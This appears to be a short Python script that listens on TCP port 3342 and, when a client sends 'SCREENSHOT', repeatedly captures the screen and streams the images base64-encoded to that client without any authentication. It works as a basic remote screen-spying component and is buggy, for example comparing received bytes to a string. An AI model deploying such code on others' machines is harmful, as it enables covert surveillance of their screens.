import socket
import base64
import sys
import glob
import os
import subprocess
from PIL import ImageGrab


server=socket.socket()
server.bind(('0.0.0.0',3342))
server.listen(5)
(client_socket, client_address) = server.accept()
d=0

data = client_socket.recv(1024)
if data=="SCREENSHOT":
    while True:
        im = ImageGrab.grab()
        im.save(r'd:\screen.jpg')

        with open("d:\screen.jpg", "rb") as imageFile:
            a = base64.b64encode(imageFile.read())
            client_socket.send(a)
